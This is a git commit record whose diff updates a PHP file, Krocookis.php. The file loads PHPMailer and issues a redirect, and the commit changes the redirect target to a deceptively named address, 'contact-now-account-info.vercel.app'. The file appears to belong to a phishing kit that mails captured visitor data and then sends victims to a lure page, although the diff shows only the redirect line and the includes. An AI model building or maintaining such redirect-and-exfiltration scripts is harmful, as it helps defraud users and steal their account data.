17184a2c649e4e9e7cbf1c0a3f4be175b866a40e
rassa4908 <rosa.maria.ads.11@gmail.com>
2025-08-31 23:00:17 +0500

    Update Krocookis.php

--- Krocookis.php
+++ Krocookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://amazing-data-appely.vercel.app/");
+header("Location: https://contact-now-account-info.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
